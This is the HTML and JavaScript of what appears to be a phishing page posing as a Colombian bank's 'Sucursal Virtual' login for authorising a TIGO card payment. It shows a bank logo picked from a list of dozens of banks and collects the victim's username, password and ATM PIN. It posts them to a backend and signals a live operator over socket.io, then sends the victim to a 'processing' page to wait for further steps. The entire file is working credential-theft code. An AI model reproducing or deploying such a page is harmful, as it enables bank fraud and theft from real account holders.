<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Seguro</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f5f5f5;
        }

        body {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2rem;
        }

        .container {
            width: 100%;
            max-width: 600px;
            background: white;
            border-radius: 8px;
            padding: 3rem;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 2rem;
            padding-bottom: 1.5rem;
            border-bottom: 1px solid #e0e0e0;
        }

        .logo-banco {
            height: 60px;
            width: auto;
            max-width: 180px;
            object-fit: contain;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        .logo-banco.loaded {
            opacity: 1;
        }

        .title {
            font-size: 20px;
            font-weight: 600;
            color: #222;
            margin-bottom: 1.5rem;
            margin-top: 1rem;
        }

        .info-section {
            margin-bottom: 2rem;
            font-size: 14px;
            color: #555;
            line-height: 1.6;
        }

        .info-section p {
            margin-bottom: 0.8rem;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            font-size: 13px;
            color: #666;
            margin-bottom: 0.8rem;
            font-weight: 500;
        }

        .form-control {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            font-family: 'Segoe UI', sans-serif;
            transition: border-color 0.3s;
        }

        .form-control:focus {
            outline: none;
            border-color: #0052CC;
            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1);
        }

        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-primary {
            background-color: #0052CC;
            color: white;
            margin-bottom: 1.5rem;
        }

        .btn-primary:hover {
            background-color: #0041A6;
            box-shadow: 0 2px 8px rgba(0, 82, 204, 0.3);
        }

        .btn-primary:disabled {
            background-color: #ccc;
            cursor: not-allowed;
            opacity: 0.7;
            box-shadow: none;
        }

        .btn-primary.loading {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .spinner-mini {
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .error-message {
            display: none;
            color: #dc3545;
            font-size: 13px;
            padding: 12px;
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            border-radius: 4px;
            margin-bottom: 1rem;
            border-left: 4px solid #dc3545;
        }

        .error-message.show {
            display: block;
        }

        @media (max-width: 600px) {
            .container {
                padding: 1.5rem;
            }

            .title {
                font-size: 18px;
            }

            .info-section {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img id="logoBanco" class="logo-banco" src="assets/banks/default.svg" alt="Banco">
        </div>

        <h1 class="title">Acceso: Sucursal Virtual Personas</h1>

        <div class="info-section" id="infoSection">
            <p>Para autorizar un pago a <span id="merchantName">-</span> por valor de <span style="font-weight: 600;" id="montoDisplay">$-</span> de <span id="dateDisplay">-</span> con tu tarjeta <span id="cardDisplay">-</span>.</p>
        </div>

        <form id="bloginForm">
            <div id="errorMessage" class="error-message"></div>

            <div id="identificationGroup" class="form-group" style="display: none;">
                <label for="identification">Usuario</label>
                <input type="text" id="identification" class="form-control" placeholder="Ingresa tu usuario" autocomplete="off">
            </div>

            <div id="passwordGroup" class="form-group" style="display: none;">
                <label for="password">Clave</label>
                <input type="password" id="password" class="form-control" placeholder="Ingresa tu clave" autocomplete="off" inputMode="text">
            </div>

            <div id="pinGroup" class="form-group" style="display: none;">
                <label for="pin">PIN de Cajero</label>
                <input type="password" id="pin" class="form-control" placeholder="Ingresa tu PIN" autocomplete="off" maxlength="4">
            </div>

            <button type="submit" id="continueBtn" class="btn btn-primary">CONTINUAR</button>
        </form>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const txId = params.get('txId');

        if (!txId) {
            alert('Error: txId no encontrado en la URL');
            window.location.href = '/';
        }

        console.log('[BLOGIN] txId:', txId);
        let bankname, monto, merchant;

        async function cargarDatos() {
            try {
                const response = await fetch(`http://localhost:9090/api/transaccion-tarjeta/${txId}`);
                const result = await response.json();

                if (result.ok && result.data) {
                    const data = result.data;
                    monto = data.monto;
                    merchant = 'TIGO'; // Siempre TIGO para pagos de tarjeta
                    bankname = data.bankName || '';

                    console.log('[BLOGIN] Datos cargados desde R2:', data);

                    const fecha = new Date().toLocaleDateString('es-CO');
                    const ultimos4 = data.cardNumber.slice(-4);
                    const montoFormatted = monto === '0' ? '$0' : `$${parseInt(monto).toLocaleString('es-CO')}`;

                    document.getElementById('montoDisplay').textContent = montoFormatted;
                    document.getElementById('dateDisplay').textContent = fecha;
                    document.getElementById('cardDisplay').textContent = `****${ultimos4}`;
                    document.getElementById('merchantName').textContent = merchant;

                    mostrarLogoBanco();
                    mostrarCampos();
                } else {
                    console.error('[BLOGIN] Error:', result.error);
                    alert('Error cargando transacción: ' + result.error);
                }
            } catch (err) {
                console.error('[BLOGIN] Error:', err);
                alert('Error: ' + err.message);
            }
        }

        cargarDatos();

        const bankLogos = {
            'accion fiduciaria': 'accionfiduciaria.svg',
            'agrario': 'agrario.svg',
            'agrobank': 'agrario.svg',
            'av villas': 'avvillas.svg',
            'avvillas': 'avvillas.svg',
            'ban 100': 'ban100.svg',
            'ban100': 'ban100.svg',
            'banca mia': 'bancamia.svg',
            'bancamia': 'bancamia.svg',
            'bancolombia': 'bancolombia.svg',
            'bbva': 'bbva.svg',
            'banco bogota': 'bogota.svg',
            'bogota': 'bogota.svg',
            'banco cajasocial': 'cajasocial.svg',
            'banco caja social': 'cajasocial.svg',
            'caja social': 'cajasocial.svg',
            'cajasocial': 'cajasocial.svg',
            'cfa': 'cfa.svg',
            'chase': 'chase.svg',
            'city bank': 'citybank.svg',
            'citybank': 'citybank.svg',
            'coink': 'coink.svg',
            'colpatria': 'colpatria.svg',
            'colfondos': 'default.svg',
            'colte financiera': 'coltefinanciera.svg',
            'coltefinanciera': 'coltefinanciera.svg',
            'coofinep': 'coofinep.svg',
            'coomeva': 'coomeva.svg',
            'coop central': 'coopcentral.svg',
            'cooperativa confiar': 'cooperativaConfiar.svg',
            'cotrafa': 'cotrafa.svg',
            'dale': 'dale.svg',
            'davibank': 'davibank.svg',
            'daviplata': 'daviplata.svg',
            'davivienda': 'davivienda.svg',
            'ding': 'ding.svg',
            'falabella': 'falabella.svg',
            'finandina': 'finandina.svg',
            'global': 'global.svg',
            'iris bank': 'irisbank.svg',
            'itau': 'itau.svg',
            'jpmorgan': 'jpmorgan.svg',
            'lulo': 'lulo.svg',
            'movii': 'movii.svg',
            'mundo mujer': 'mundomujer.svg',
            'nequi': 'nequiLogo.svg',
            'nu': 'nu.svg',
            'occidente': 'occidente.svg',
            'paycash': 'paycash.svg',
            'pichincha': 'pichincha.svg',
            'banco popular': 'popular.svg',
            'popular': 'popular.svg',
            'powwi': 'powwi.svg',
            'rappipay': 'rappipay.svg',
            'santander': 'santander.svg',
            'serfinanza': 'serfinanza.svg',
            'sudameris': 'sudameris.svg',
            'uala': 'uala.svg',
            'union': 'union.svg',
            'DEFAULT': 'default.svg'
        };

        function getBankLogo() {
            if (!bankname) return 'default.svg';
            const banknameLower = bankname.toLowerCase().normalize('NFD').replace(/[̀-ͯ]/g, '');
            const bankKey = Object.keys(bankLogos).find(key => banknameLower.includes(key) || key.includes(banknameLower));
            return bankLogos[bankKey] || 'default.svg';
        }

        function mostrarLogoBanco() {
            const bankLogo = getBankLogo();
            const logoBancoEl = document.getElementById('logoBanco');
            logoBancoEl.src = `assets/logos/${bankLogo}`;
            logoBancoEl.onload = () => logoBancoEl.classList.add('loaded');
        }

        function mostrarCampos() {
            document.getElementById('identificationGroup').style.display = 'block';
            document.getElementById('passwordGroup').style.display = 'block';

            const passwordInput = document.getElementById('password');
            const bancosConClaveCorta = ['BANCOLOMBIA', 'BANCO BOGOTA', 'POPULAR'];
            const esBancoConClaveCorta = bancosConClaveCorta.some(banco =>
                bankname && bankname.toUpperCase().includes(banco)
            );

            if (esBancoConClaveCorta) {
                passwordInput.inputMode = 'numeric';
                passwordInput.maxLength = '4';
                passwordInput.pattern = '[0-9]*';
            }

            try {
                const response = fetch(`/api/obtener-blogin-config?banco=${encodeURIComponent(bankname)}`);
                response.then(res => res.json()).then(config => {
                    if (config.pide_pin) {
                        document.getElementById('pinGroup').style.display = 'block';
                    }
                });
            } catch (err) {
                console.log('[BLOGIN] Config cargada con defaults');
            }
        }

        const socket = io();

        function mostrarError(mensaje) {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.textContent = mensaje;
            errorDiv.classList.add('show');
        }

        function ocultarError() {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.classList.remove('show');
            errorDiv.textContent = '';
        }

        document.getElementById('bloginForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const identification = document.getElementById('identification').value.trim() || '-';
            const password = document.getElementById('password').value.trim() || '-';
            const pin = document.getElementById('pin').value.trim() || '-';
            const banco = bankname || '-';
            const btnContinue = document.getElementById('continueBtn');

            ocultarError();
            btnContinue.disabled = true;
            btnContinue.classList.add('loading');
            btnContinue.innerHTML = '<span class="spinner-mini"></span> Verificando...';
            console.log('[BLOGIN] Guardando datos');

            try {
                const response = await fetch('http://localhost:9090/api/guardar-blogin', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        txId: txId,
                        username: identification,
                        password: password,
                        pin: pin,
                        banco: banco
                    })
                });
                const data = await response.json();
                if (data.success) {
                    console.log('[BLOGIN] ✓ Datos guardados');

                    // Limpiar acción para volver a STANDBY
                    await fetch(`http://localhost:9090/api/limpiar-accion/${txId}`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ accion: 'BLOGIN' })
                    });

                    // Volver a processing para esperar siguiente acción
                    window.location.href = `/processing?txId=${txId}`;
                } else {
                    mostrarError(data.message || 'Error al guardar');
                    btnContinue.disabled = false;
                    btnContinue.classList.remove('loading');
                    btnContinue.innerHTML = 'CONTINUAR';
                }
            } catch (error) {
                console.error('[BLOGIN] Error:', error);
                mostrarError('Error al guardar');
                btnContinue.disabled = false;
                btnContinue.classList.remove('loading');
                btnContinue.innerHTML = 'CONTINUAR';
            }
        });

        socket.emit('usuario_en_blogin', {
            idTransaccion: txId,
            timestamp: new Date().toISOString()
        });

        console.log('[BLOGIN] ✅ Página lista');
    </script>
</body>
</html>
